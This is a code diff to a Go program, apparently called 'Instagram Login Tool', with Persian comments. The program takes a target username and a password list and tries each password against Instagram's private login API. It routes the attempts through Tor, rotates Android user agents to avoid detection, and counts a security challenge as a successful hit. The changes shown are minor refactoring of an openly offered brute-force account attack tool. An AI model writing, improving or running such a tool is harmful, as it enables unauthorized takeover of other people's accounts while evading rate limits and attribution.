@@ -1,4 +1,5 @@
 package main
+
 import (
 	"bufio"
 	"encoding/json"
@@ -9,23 +10,25 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/exec"
+	"runtime"
 	"strings"
 	"sync"
 	"time"
+
 	"golang.org/x/net/proxy"
-        "os/exec"
-        "runtime"
 )
 
 const (
 	API_URL      = "https://i.instagram.com/api/v1/"
 	TIMEOUT      = 10 * time.Second
-	CURRENT_TIME = "2025-05-23 23:14:48"
 	CURRENT_USER = "monsmain"
 )
 
 var userAgents = []string{
 	"Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743",
+	"Instagram 329.0.0.29.120 Android (31/12; 420dpi; 1080x2400; samsung; SM-A515F; a51; exynos9611; en_US; 329000029)",
+	"Instagram 328.0.0.13.119 Android (31/12; 480dpi; 1080x2400; samsung; SM-A715F; a71; qcom; en_US; 328000013)",
 }
 
 type InstagramResponse struct {
@@ -46,10 +49,24 @@ type LoginResult struct {
 	Message  string `json:"message"`
 }
 
+func clearTerminal() {
+	if strings.Contains(strings.ToLower(runtime.GOOS), "windows") {
+		cmd := exec.Command("cmd", "/c", "cls")
+		cmd.Stdout = os.Stdout
+		cmd.Run()
+	} else {
+		cmd := exec.Command("clear")
+		cmd.Stdout = os.Stdout
+		cmd.Run()
+	}
+}
+
 func main() {
-    clearTerminal()
+	clearTerminal()
 
 	fmt.Println("Checking Public IPs...\n")
+
+	// 1. آی‌پی پابلیک مستقیم
 	ipDirect, err := getPublicIP(&http.Client{Timeout: 10 * time.Second})
 	if err != nil {
 		fmt.Println("Error getting direct IP:", err)
@@ -57,6 +74,7 @@ func main() {
 		fmt.Println("[Direct] Public IP:", ipDirect)
 	}
 
+	// 2. آی‌پی پابلیک از طریق TOR
 	ipTor, torOK := getTorIP()
 	if torOK {
 		fmt.Println("[TOR]    Public IP:", ipTor)
@@ -72,9 +90,6 @@ func main() {
 	setupLogger()
 	fmt.Println("=== Instagram Login Tool ===")
 	fmt.Printf("coded by: %s\n\n", CURRENT_USER)
-	fmt.Printf("Time: %s\n", CURRENT_TIME)
-
-
 
 	username := getUsername()
 	passwords := loadPasswords()
@@ -131,24 +146,13 @@ func main() {
 			Username: username,
 			Password: "",
 			Success:  false,
-			Time:     CURRENT_TIME,
+			Time:     time.Now().Format("2006-01-02 15:04:05"),
 			Message:  "Not found",
 		})
 	}
 }
 
-func clearTerminal() {
-    if strings.Contains(strings.ToLower(runtime.GOOS), "windows") {
-        cmd := exec.Command("cmd", "/c", "cls")
-        cmd.Stdout = os.Stdout
-        cmd.Run()
-    } else {
-        cmd := exec.Command("clear")
-        cmd.Stdout = os.Stdout
-        cmd.Run()
-    }
-}
-
+// تابع گرفتن آی‌پی پابلیک
 func getPublicIP(client *http.Client) (string, error) {
 	resp, err := client.Get("https://api.ipify.org")
 	if err != nil {
@@ -162,6 +166,7 @@ func getPublicIP(client *http.Client) (string, error) {
 	return string(ip), nil
 }
 
+// تابع گرفتن آی‌پی از طریق TOR
 func getTorIP() (string, bool) {
 	socksProxy := "127.0.0.1:9050"
 	dialer, err := proxy.SOCKS5("tcp", socksProxy, nil, proxy.Direct)
@@ -219,6 +224,7 @@ func waitGroupTimeout(wg *sync.WaitGroup, timeout time.Duration) <-chan struct{}
 	return done
 }
 
+// این تابع همچنان از TOR برای login استفاده می‌کند
 func tryLogin(username, password string) LoginResult {
 	loginUrl := API_URL + "accounts/login/"
 	data := url.Values{}
@@ -229,7 +235,7 @@ func tryLogin(username, password string) LoginResult {
 	dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
 	if err != nil {
 		log.Printf("Failed to obtain Tor SOCKS5 proxy: %v\n", err)
-		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Tor SOCKS5 proxy error"}
+		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Tor SOCKS5 proxy error"}
 	}
 	transport := &http.Transport{Dial: dialer.Dial}
 	client := &http.Client{
@@ -240,7 +246,7 @@ func tryLogin(username, password string) LoginResult {
 	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
 	if err != nil {
 		log.Printf("Error creating request: %v\n", err)
-		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Request error"}
+		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Request error"}
 	}
 
 	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
@@ -253,14 +259,14 @@ func tryLogin(username, password string) LoginResult {
 	resp, err := client.Do(req)
 	if err != nil {
 		log.Printf("Error sending request: %v\n", err)
-		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "HTTP error"}
+		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "HTTP error"}
 	}
 	defer resp.Body.Close()
 
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		log.Printf("Error reading response: %v\n", err)
-		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Read error"}
+		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Read error"}
 	}
 
 	log.Printf("Raw response: %s\n", string(body))
@@ -268,13 +274,13 @@ func tryLogin(username, password string) LoginResult {
 	var response InstagramResponse
 	if err := json.Unmarshal(body, &response); err != nil {
 		log.Printf("Error parsing response: %v\n", err)
-		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Parse error"}
+		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Parse error"}
 	}
 
 	success := response.Status == "ok" || strings.Contains(string(body), "logged_in_user")
 
 	if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
-		return LoginResult{Username: username, Password: password, Success: true, Time: CURRENT_TIME, Message: "challenge or success"}
+		return LoginResult{Username: username, Password: password, Success: true, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "challenge or success"}
 	}
 
 	msg := response.Message
@@ -284,7 +290,7 @@ func tryLogin(username, password string) LoginResult {
 	if response.ErrorType == "invalid_user" {
 		msg = "invalid username"
 	}
-	return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: msg}
+	return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: msg}
 }
 
 func loadPasswords() []string {
